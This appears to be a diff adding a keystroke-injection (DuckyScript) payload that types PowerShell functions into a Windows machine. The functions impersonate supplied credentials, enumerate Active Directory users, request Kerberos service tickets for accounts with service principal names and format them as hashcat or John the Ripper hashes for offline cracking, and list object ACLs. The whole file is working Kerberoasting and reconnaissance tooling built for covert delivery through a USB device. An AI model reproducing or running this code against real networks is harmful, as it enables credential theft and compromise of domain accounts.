@@ -1,0 +1,376 @@
+DEFAULTCHARDELAY 15
+
+STRINGLN function Invoke-ImpersonateUser {
+STRINGLN     Param(
+STRINGLN         [PSCredential]$Credential,
+STRINGLN         [IntPtr]$TokenHandle
+STRINGLN     )
+
+STRINGLN     if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+STRINGLN         Write-Warning "[Invoke-ImpersonateUser] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+STRINGLN     }
+
+STRINGLN     if ($PSBoundParameters['TokenHandle']) {
+STRINGLN         $LogonTokenHandle = $TokenHandle
+STRINGLN     }
+STRINGLN     else {
+STRINGLN         $LogonTokenHandle = [IntPtr]::Zero
+STRINGLN         $NetworkCredential = $Credential.GetNetworkCredential()
+STRINGLN         $UserDomain = $NetworkCredential.Domain
+STRINGLN         $UserName = $NetworkCredential.UserName
+STRINGLN         Write-Warning "[Invoke-ImpersonateUser] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+STRINGLN         # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
+STRINGLN         #   this is to simulate "runas.exe /netonly" functionality
+STRINGLN         $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle); $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+STRINGLN         if (-not $Result) {
+STRINGLN             throw "[Invoke-ImpersonateUser] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+STRINGLN         }
+STRINGLN     }
+
+STRINGLN     # actually impersonate the token from LogonUser()
+STRINGLN     $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
+
+STRINGLN     if (-not $Result) {
+STRINGLN         throw "[Invoke-ImpersonateUser] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+STRINGLN     }
+
+STRINGLN     Write-Verbose "[Invoke-ImpersonateUser] Alternate credentials successfully impersonated"
+STRINGLN     $LogonTokenHandle
+STRINGLN }
+ENTER
+STRINGLN function Invoke-RevertToSelf {
+STRINGLN     Param(
+STRINGLN         [IntPtr]$TokenHandle
+STRINGLN     )
+STRINGLN     if ($TokenHandle) {
+STRINGLN         Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+STRINGLN         $Result = $Kernel32::CloseHandle($TokenHandle)
+STRINGLN     }
+
+STRINGLN     $Result = $Advapi32::RevertToSelf(); $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+STRINGLN     if (-not $Result) {
+STRINGLN         throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+STRINGLN     }
+
+STRINGLN     Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
+STRINGLN }
+ENTER
+STRINGLN function Get-ADObject {
+
+STRINGLN     Param(
+STRINGLN         [String]$Domain = $env:USERDNSDOMAIN,
+STRINGLN         [PSCredential]$Credential,
+STRINGLN         [String]$Identity = $env:USERNAME,
+STRINGLN         [Array]$Property = @(),
+STRINGLN         [Parameter()]
+STRINGLN         [ValidateSet('group', 'user', 'computer')]
+STRINGLN         [String]$ObjectCategory = 'user'
+STRINGLN     )
+
+STRINGLN     if ($Credential) {
+STRINGLN         $LogonToken = Invoke-ImpersonateUser -Credential $Credential
+STRINGLN     }
+
+STRINGLN     if ($Property) {
+STRINGLN         $customObject = @()
+STRINGLN         $searcher = [adsisearcher]::new([adsi]"LDAP://$Domain")
+STRINGLN         $searcher.Filter = "(&(objectCategory=$ObjectCategory)(samaccountname=$Identity))"
+STRINGLN         $searcher.PageSize = 1000
+
+STRINGLN         foreach ($i in $Property) { $searcher.PropertiesToLoad.Add($i) | Out-Null }
+
+STRINGLN         foreach ($object in $searcher.FindAll()) {
+STRINGLN             $tmpData = [ordered]@{}
+STRINGLN             foreach ($i in $Property) {
+STRINGLN                 if (-Not $object.properties.$i) { continue }
+STRINGLN                 if ($object.properties.$i[0].GetType().Name -eq "Byte[]") {
+STRINGLN                     $value = (New-Object System.Security.Principal.SecurityIdentifier($object.properties.$i[0], 0)).Value
+STRINGLN                 }
+STRINGLN                 else {
+STRINGLN                     $value = $object.properties.$i #-join ", "
+STRINGLN                 }
+
+STRINGLN                 try {
+STRINGLN                     $checked = [datetime]::FromFileTime($value)
+STRINGLN                     if ($checked.year -lt 1900) {
+STRINGLN                         $checked = $null
+STRINGLN                     }
+STRINGLN                 }
+STRINGLN                 catch {
+STRINGLN                     $checked = $value
+STRINGLN                 }
+STRINGLN                 $tmpData.Add($i, $checked)
+STRINGLN             }
+STRINGLN             $customObject += New-Object -TypeName psobject -Property $tmpData
+STRINGLN         }
+
+STRINGLN         $customObject
+STRINGLN     }
+STRINGLN     else {
+STRINGLN         [adsisearcher]::new([adsi]"LDAP://$Domain", "(&(objectCategory=$ObjectCategory)(samaccountname=$Identity))").FindAll().properties
+STRINGLN     }
+
+STRINGLN     if ($LogonToken) {
+STRINGLN         Invoke-RevertToSelf -TokenHandle $LogonToken
+STRINGLN     }
+STRINGLN }
+ENTER
+STRINGLN function Get-UserTicket {
+
+STRINGLN     Param(
+STRINGLN         [String]$Domain = $env:USERDNSDOMAIN,
+STRINGLN         [PSCredential]$Credential,
+STRINGLN         [String]$UserSPN = "*",
+STRINGLN         [String]$Identity = "*",
+STRINGLN         [String]$OutputFormat = 'hashcat',
+STRINGLN         [Int32]$Delay = 0
+STRINGLN     )
+
+STRINGLN     if ($Credential) {
+STRINGLN         $LogonToken = Invoke-ImpersonateUser -Credential $Credential
+STRINGLN     }
+
+STRINGLN     $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
+STRINGLN     $searcher = [adsisearcher]::new([adsi]"LDAP://$Domain")
+STRINGLN     $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=$UserSPN)(!samaccountname=krbtgt)(samaccountname=$Identity))"
+STRINGLN     foreach ($i in "samaccountname", "distinguishedname", "serviceprincipalname") { $searcher.PropertiesToLoad.Add($i) | Out-Null }
+STRINGLN     $searcher.PageSize = 1000
+
+STRINGLN     $ADobjects = $searcher.FindAll()
+
+STRINGLN     foreach ($obj in $ADobjects) {
+STRINGLN         $customObject = @()
+STRINGLN         $tmpData = [ordered]@{}
+STRINGLN         $DistinguishedName = $obj.properties.distinguishedname[0]
+STRINGLN         $UserSPNs = $obj.properties.serviceprincipalname
+STRINGLN         $UserSPN, $HexStream, $Hash, $Etype = Get-Ticket($UserSPNs)
+
+STRINGLN         if ($DistinguishedName -ne 'UNKNOWN') {
+STRINGLN             $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=', '' -replace ',', '.'
+STRINGLN         }
+STRINGLN         else {
+STRINGLN             $UserDomain = 'UNKNOWN'
+STRINGLN         }
+
+STRINGLN         $SamAccountName = $obj.properties.samaccountname[0]
+STRINGLN         $tmpData.Add("Name", "$UserDomain\$SamAccountName")
+STRINGLN         $tmpData.Add("SPN", $UserSPN)
+STRINGLN         $tmpData.Add("TicketByteHexStream", $HexStream)
+
+STRINGLN         if ($Hash) {
+STRINGLN             # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
+STRINGLN             if ($OutputFormat -match 'John') {
+STRINGLN                 $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):`$krb5tgs`$$($Etype)`$$Hash"
+STRINGLN             }
+STRINGLN             else {
+STRINGLN                 # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+STRINGLN                 $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$UserSPN*`$$Hash"
+STRINGLN             }
+STRINGLN             $tmpData.Add("Hash", $HashFormat)
+STRINGLN         }
+STRINGLN         $customObject += New-Object -TypeName psobject -Property $tmpData
+STRINGLN         $customObject | Format-List
+STRINGLN         Start-Sleep -Seconds $Delay
+
+STRINGLN         $UserSPN = $null
+STRINGLN     }
+
+STRINGLN     if ($LogonToken) {
+STRINGLN         Invoke-RevertToSelf -TokenHandle $LogonToken
+STRINGLN     }
+STRINGLN }
+ENTER
+STRINGLN function Get-Ticket ($UserSPNs) {
+
+STRINGLN     foreach ($UserSPN in $UserSPNs) {
+STRINGLN         $HexStream = $null
+STRINGLN         try {
+STRINGLN             $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+STRINGLN             $TicketByteStream = $Ticket.GetRequest()
+STRINGLN             $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+STRINGLN             continue
+STRINGLN         }
+STRINGLN         catch {
+STRINGLN             $HexStream = $Error[0]
+STRINGLN         }
+STRINGLN     }
+
+STRINGLN     if ($HexStream -like "*Exception*") {
+STRINGLN         continue
+STRINGLN         #return $UserSPN, $HexStream, $null, $null
+STRINGLN     }
+
+STRINGLN     if ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
+STRINGLN         $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
+STRINGLN         $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16) - 4
+STRINGLN         $CipherText = $Matches.DataToEnd.Substring(0, $CipherTextLen * 2)
+
+STRINGLN         # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
+STRINGLN         if ($Matches.DataToEnd.Substring($CipherTextLen * 2, 4) -ne 'A482') {
+STRINGLN             Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+STRINGLN             $Hash = $null
+STRINGLN             $HexStream = ([Bitconverter]::ToString($TicketByteStream).Replace('-', ''))
+STRINGLN         }
+STRINGLN         else {
+STRINGLN             $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
+STRINGLN             $HexStream = $null
+STRINGLN         }
+STRINGLN     }
+STRINGLN     else {
+STRINGLN         Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+STRINGLN         $Hash = $null
+STRINGLN         $HexStream = [Bitconverter]::ToString($TicketByteStream).Replace('-', '')
+STRINGLN     }
+
+STRINGLN     return $UserSPN, $HexStream, $Hash, $Etype
+STRINGLN }
+ENTER
+STRINGLN function Convert-FromSID {
+STRINGLN     Param(
+STRINGLN         [String]$SID
+STRINGLN     )
+
+STRINGLN     $SID = $SID.trim('*')
+
+STRINGLN     $Identity = Switch ($SID) {
+STRINGLN         'S-1-0' { 'Null Authority' }
+STRINGLN         'S-1-0-0' { 'Nobody' }
+STRINGLN         'S-1-1' { 'World Authority' }
+STRINGLN         'S-1-1-0' { 'Everyone' }
+STRINGLN         'S-1-2' { 'Local Authority' }
+STRINGLN         'S-1-2-0' { 'Local' }
+STRINGLN         'S-1-2-1' { 'Console Logon ' }
+STRINGLN         'S-1-3' { 'Creator Authority' }
+STRINGLN         'S-1-3-0' { 'Creator Owner' }
+STRINGLN         'S-1-3-1' { 'Creator Group' }
+STRINGLN         'S-1-3-2' { 'Creator Owner Server' }
+STRINGLN         'S-1-3-3' { 'Creator Group Server' }
+STRINGLN         'S-1-3-4' { 'Owner Rights' }
+STRINGLN         'S-1-4' { 'Non-unique Authority' }
+STRINGLN         'S-1-5' { 'NT Authority' }
+STRINGLN         'S-1-5-1' { 'Dialup' }
+STRINGLN         'S-1-5-2' { 'Network' }
+STRINGLN         'S-1-5-3' { 'Batch' }
+STRINGLN         'S-1-5-4' { 'Interactive' }
+STRINGLN         'S-1-5-6' { 'Service' }
+STRINGLN         'S-1-5-7' { 'Anonymous' }
+STRINGLN         'S-1-5-8' { 'Proxy' }
+STRINGLN         'S-1-5-9' { 'Enterprise Domain Controllers' }
+STRINGLN         'S-1-5-10' { 'Principal Self' }
+STRINGLN         'S-1-5-11' { 'Authenticated Users' }
+STRINGLN         'S-1-5-12' { 'Restricted Code' }
+STRINGLN         'S-1-5-13' { 'Terminal Server Users' }
+STRINGLN         'S-1-5-14' { 'Remote Interactive Logon' }
+STRINGLN         'S-1-5-15' { 'This Organization ' }
+STRINGLN         'S-1-5-17' { 'This Organization ' }
+STRINGLN         'S-1-5-18' { 'Local System' }
+STRINGLN         'S-1-5-19' { 'NT Authority' }
+STRINGLN         'S-1-5-20' { 'NT Authority' }
+STRINGLN         'S-1-5-80-0' { 'All Services ' }
+STRINGLN         'S-1-5-32-544' { 'BUILTIN\Administrators' }
+STRINGLN         'S-1-5-32-545' { 'BUILTIN\Users' }
+STRINGLN         'S-1-5-32-546' { 'BUILTIN\Guests' }
+STRINGLN         'S-1-5-32-547' { 'BUILTIN\Power Users' }
+STRINGLN         'S-1-5-32-548' { 'BUILTIN\Account Operators' }
+STRINGLN         'S-1-5-32-549' { 'BUILTIN\Server Operators' }
+STRINGLN         'S-1-5-32-550' { 'BUILTIN\Print Operators' }
+STRINGLN         'S-1-5-32-551' { 'BUILTIN\Backup Operators' }
+STRINGLN         'S-1-5-32-552' { 'BUILTIN\Replicators' }
+STRINGLN         'S-1-5-32-554' { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
+STRINGLN         'S-1-5-32-555' { 'BUILTIN\Remote Desktop Users' }
+STRINGLN         'S-1-5-32-556' { 'BUILTIN\Network Configuration Operators' }
+STRINGLN         'S-1-5-32-557' { 'BUILTIN\Incoming Forest Trust Builders' }
+STRINGLN         'S-1-5-32-558' { 'BUILTIN\Performance Monitor Users' }
+STRINGLN         'S-1-5-32-559' { 'BUILTIN\Performance Log Users' }
+STRINGLN         'S-1-5-32-560' { 'BUILTIN\Windows Authorization Access Group' }
+STRINGLN         'S-1-5-32-561' { 'BUILTIN\Terminal Server License Servers' }
+STRINGLN         'S-1-5-32-562' { 'BUILTIN\Distributed COM Users' }
+STRINGLN         'S-1-5-32-569' { 'BUILTIN\Cryptographic Operators' }
+STRINGLN         'S-1-5-32-573' { 'BUILTIN\Event Log Readers' }
+STRINGLN         'S-1-5-32-574' { 'BUILTIN\Certificate Service DCOM Access' }
+STRINGLN         'S-1-5-32-575' { 'BUILTIN\RDS Remote Access Servers' }
+STRINGLN         'S-1-5-32-576' { 'BUILTIN\RDS Endpoint Servers' }
+STRINGLN         'S-1-5-32-577' { 'BUILTIN\RDS Management Servers' }
+STRINGLN         'S-1-5-32-578' { 'BUILTIN\Hyper-V Administrators' }
+STRINGLN         'S-1-5-32-579' { 'BUILTIN\Access Control Assistance Operators' }
+STRINGLN         'S-1-5-32-580' { 'BUILTIN\Access Control Assistance Operators' }
+STRINGLN     }
+
+STRINGLN     if ($Identity) {
+
+STRINGLN         return $Identity
+STRINGLN     }
+STRINGLN     else {
+
+STRINGLN         try {
+
+STRINGLN             $objSID = New-Object System.Security.Principal.SecurityIdentifier ("$SID")
+STRINGLN             $Identity = $objSID.Translate( [System.Security.Principal.NTAccount]).Value
+
+STRINGLN             return $Identity
+
+STRINGLN         }
+STRINGLN         catch {
+
+STRINGLN             return $SID
+
+STRINGLN         }
+STRINGLN     }
+STRINGLN }
+ENTER
+STRINGLN function Get-ObjectACL {
+STRINGLN     Param(
+STRINGLN         [Switch]$In,
+STRINGLN         [Switch]$Out,
+STRINGLN         [String]$Domain = $env:USERDNSDOMAIN,
+STRINGLN         [PSCredential]$Credential,
+STRINGLN         [parameter(Mandatory = $true)]
+STRINGLN         [String]$Identity,
+STRINGLN         [String]$ObjectCategory = "user",
+STRINGLN         [Array]$ADRight = @()
+STRINGLN     )
+
+STRINGLN     if ((!$In -and !$Out) -or ($In -and $Out)) {
+STRINGLN         Write-Host "Choose direction of object ACL. Only 1 can be applied at a time."
+STRINGLN         break
+STRINGLN     }
+
+STRINGLN     if ($In) {
+STRINGLN         $customObject = @()
+STRINGLN         $searcher = [adsisearcher]::new([adsi]"LDAP://$Domain")
+STRINGLN         $searcher.Filter = "(&(objectCategory=$ObjectCategory)(name=$Identity))"
+
+STRINGLN         $ADObject = [adsi]$searcher.FindAll().Path
+STRINGLN         $ACLs = $ADObject.ObjectSecurity.Access
+
+STRINGLN         foreach ($ACL in $ACLs) {
+STRINGLN             $tmpData = [ordered]@{}
+STRINGLN             if (($ACL.AccessControlType -eq "Allow") -and ($ACL.ActiveDirectoryRights -like "*$ADRight*")) {
+STRINGLN                 if ($ACL.IdentityReference -like "S-1*") {
+STRINGLN                     $name = Convert-FromSID -SID $ACL.IdentityReference
+STRINGLN                     $tmpData.Add("Source", $name)
+STRINGLN                 }
+STRINGLN                 else {
+STRINGLN                     $tmpData.Add("Source", $ACL.IdentityReference)
+STRINGLN                 }
+
+STRINGLN                 #$tmpData.Add("Source",$ACL.IdentityReference)
+STRINGLN                 $tmpData.Add("ObjectType", $ACL.ObjectType)
+STRINGLN                 $tmpData.Add("ADRights", $ACL.ActiveDirectoryRights)
+STRINGLN                 $tmpData.Add("IsInherited", $ACL.IsInherited)
+STRINGLN                 $tmpData.Add("InheritedObjectType", $ACL.InheritedObjectType)
+STRINGLN                 $tmpData.Add("Destination", $Identity)
+
+STRINGLN                 $customObject += New-Object -TypeName psobject -Property $tmpData
+STRINGLN             }
+STRINGLN         }
+STRINGLN         $customObject
+STRINGLN     }
+STRINGLN     if ($Out) {
+STRINGLN         Write-Output "Out"
+STRINGLN     }
+
+STRINGLN }
